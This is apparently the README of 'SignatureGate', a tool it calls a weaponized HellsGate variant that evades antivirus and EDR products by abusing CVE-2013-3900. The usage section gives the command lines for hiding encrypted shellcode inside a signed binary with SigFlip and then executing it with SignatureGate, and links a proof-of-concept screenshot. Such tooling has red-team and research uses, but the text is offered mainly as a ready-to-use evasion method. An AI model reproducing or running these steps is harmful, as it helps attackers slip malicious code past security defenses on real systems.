# SignatureGate

Weaponized version of HellsGate, bypassing AV/EDR/EPPs by abusing opt-in-fix CVE-2013-3900. Most code is from https://github.com/am0nsec/SharpHellsGate and https://github.com/med0x2e/SigFlip.

## Usage

Generate shellcode from a .NET assembly with Donut.

Generate malicious signed file with:


```
.\SigFlip.exe -i path_to_signed_binary -s path_to_malicious_shellcode -o path_to_output_file -e encryption_key
```

Run the malicious shellcode from the file with

```
.\SignatureGate.exe path_to_malicious_file encryption_key
```

## Proof of Concept

![SignatureGate](https://github.com/florylsk/SignatureGate/assets/46110263/1e89b761-3a6e-42d9-b15f-96ab70f011c7)
